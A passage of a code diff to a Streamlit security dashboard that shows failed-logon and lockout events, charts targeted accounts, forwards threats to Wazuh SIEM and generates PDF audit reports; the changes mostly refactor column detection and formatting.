                     st.error(f"👤 **Account:** `{account}`\n\n🚨 **Status:** LOCKED (AADSTS50053)\n\n📍 **Attempts:** {lockout_users[account]} Failures")
         else:
             st.success("✅ No accounts currently locked by Microsoft Smart Lockout threshold.")
 
         st.markdown("---")
-        
+
         col_feed, col_logs = st.columns([1, 1.2])
-        
+
         with col_feed:
             st.subheader("⚡ Live Incident Feed")
             severity_filter = st.selectbox("Filter by Severity", ["ALL", "CRITICAL", "HIGH", "MEDIUM", "LOW"])
-            
+
             for idx, row in df.iterrows():
-                event_id = row.get(event_col, 4625)
-                user = row.get(user_col, "Unknown")
-                ip = row.get(ip_col, "127.0.0.1")
+                event_id = row.get(event_col, 4625) if event_col else 4625
+                user = row.get(user_col, "Unknown") if user_col else "Unknown"
+                ip = row.get(ip_col, "127.0.0.1") if ip_col else "127.0.0.1"
                 err_code = row.get("ErrorCode", "AADSTS50126")
-                
+
                 if err_code == "AADSTS50053" or (event_id == 4625 and idx > 3):
                     sev = "CRITICAL"
                 elif err_code == "AADSTS50034":
@@ -471,10 +578,10 @@ with tab4:
                     sev = "HIGH"
                 else:
                     sev = "LOW"
-                    
+
                 if severity_filter != "ALL" and sev != severity_filter:
                     continue
-                    
+
                 if sev == "CRITICAL":
                     st.error(f"🔴 **[CRITICAL]** Account Lockout / Brute Force on `{user}` from `{ip}` | Error: `{err_code}`")
                 elif sev == "HIGH":
@@ -493,44 +600,50 @@ with tab4:
 # TAB 5: Interactive Analytics
 with tab5:
     st.header("📊 Interactive Analytics & Threat Visualizations")
-    
+
     if 'df' in st.session_state and not st.session_state['df'].empty:
         df = st.session_state['df']
-        user_col = 'TargetUserName' if 'TargetUserName' in df.columns else ('user' if 'user' in df.columns else 'TargetUser')
-        event_col = 'EventID' if 'EventID' in df.columns else ('event_id' if 'event_id' in df.columns else None)
+        cols = detect_columns(df)
+        event_col, user_col = cols["event"], cols["user"]
 
         col_left, col_right = st.columns(2)
-        
+
         with col_left:
             st.subheader("🎯 Top 5 Targeted Accounts")
-            if event_col and user_col in df.columns:
+            if event_col and user_col:
                 failed_df = df[df[event_col] == 4625]
                 if len(failed_df) > 0:
                     top_users = failed_df[user_col].value_counts().head(5).reset_index()
                     top_users.columns = ['Account Name', 'Failed Attempts']
-                    
-                    fig_bar = px.bar(top_users, x='Failed Attempts', y='Account Name', orientation='h', color='Failed Attempts', color_continuous_scale='Reds', text='Failed Attempts')
+
+                    fig_bar = px.bar(top_users, x='Failed Attempts', y='Account Name', orientation='h',
+                                      color='Failed Attempts', color_continuous_scale='Reds', text='Failed Attempts')
                     st.plotly_chart(fig_bar, use_container_width=True)
                 else:
                     st.info("No failed logon attempts recorded.")
+            else:
+                st.info("İstifadəçi/hadisə sütunları tapılmadı.")
 
         with col_right:
             st.subheader("📊 Failure vs Success Ratio")
             if event_col:
                 status_counts = df[event_col].map({4625: 'FAILED (4625)', 4624: 'SUCCESS (4624)'}).value_counts().reset_index()
                 status_counts.columns = ['Logon Status', 'Event Count']
-                
-                fig_pie = px.pie(status_counts, names='Logon Status', values='Event Count', color='Logon Status', color_discrete_map={'FAILED (4625)':'#ef553b', 'SUCCESS (4624)':'#00cc96'}, hole=0.4)
+
+                fig_pie = px.pie(status_counts, names='Logon Status', values='Event Count', color='Logon Status',
+                                  color_discrete_map={'FAILED (4625)': '#ef553b', 'SUCCESS (4624)': '#00cc96'}, hole=0.4)
                 st.plotly_chart(fig_pie, use_container_width=True)
 
         st.markdown("---")
         st.subheader("📈 Attack Intensity Timeline & Velocity")
         df_timeline = df.copy()
         df_timeline['Attempt_Sequence'] = df_timeline.index + 1
-        
+
         if event_col:
-            df_timeline['Event_Type'] = df_timeline[event_col].apply(lambda x: "Failed Logon (4625)" if x == 4625 else "Success Logon (4624)")
-            fig_line = px.line(df_timeline, x='Attempt_Sequence', y=df_timeline.index, color='Event_Type', markers=True, color_discrete_map={'Failed Logon (4625)':'#d62728', 'Success Logon (4624)':'#2ca02c'})
+            df_timeline['Event_Type'] = df_timeline[event_col].apply(
+                lambda x: "Failed Logon (4625)" if x == 4625 else "Success Logon (4624)")
+            fig_line = px.line(df_timeline, x='Attempt_Sequence', y=df_timeline.index, color='Event_Type', markers=True,
+                                color_discrete_map={'Failed Logon (4625)': '#d62728', 'Success Logon (4624)': '#2ca02c'})
             st.plotly_chart(fig_line, use_container_width=True)
     else:
         st.warning("⚠️ No data available for visualization.")
@@ -541,7 +654,7 @@ with tab6:
     if 'df' in st.session_state and not st.session_state['df'].empty:
         df = st.session_state['df']
         st.warning("⚠️ High Risk Identity Threats Detected!")
-        
+
         if st.button("🚨 Dispatch All Threats to Wazuh SIEM"):
             success_count = 0
             for idx, row in df.iterrows():
@@ -584,22 +697,23 @@ with tab7:
         else:
             st.error(f"❌ Failed: {res}")
 
-# TAB 8: Security Audit Report Generator (NEW MODULE)
+# TAB 8: Security Audit Report Generator
 with tab8:
     st.header("📄 Automated PDF Security Audit Report Generator")
-    st.caption("Generate an official, executive-ready PDF Audit Report containing attack telemetry, risk scoring, and AI mitigation history.")
+    st.caption("Generate an official, executive-ready PDF Audit Report containing attack telemetry, risk scoring, and remediation history.")
 
     if 'df' in st.session_state and not st.session_state['df'].empty:
         df = st.session_state['df']
         resolved_users = st.session_state.get('resolved_users', set())
-        
-        event_col = 'EventID' if 'EventID' in df.columns else ('event_id' if 'event_id' in df.columns else None)
+
+        cols = detect_columns(df)
+        event_col = cols["event"]
         failed_attempts = len(df[df[event_col].astype(str).str.contains('4625')]) if event_col else len(df)
         active_failures = max(0, failed_attempts - len(resolved_users))
         posture_score = max(0, 100 - (active_failures * 10))
 
         st.subheader("📋 Report Content Preview Summary")
-        
+
         c1, c2, c3 = st.columns(3)
         with c1:
             st.info(f"**Total Events Included:** {len(df)}")
@@ -611,9 +725,8 @@ with tab8:
         st.markdown("---")
         st.subheader("📥 Export Audit Report")
 
-        # Generate PDF Bytes
         pdf_bytes = generate_pdf_report(df, resolved_users, posture_score)
-        
+
         timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"Argus_ITDR_Security_Report_{timestamp_str}.pdf"
 
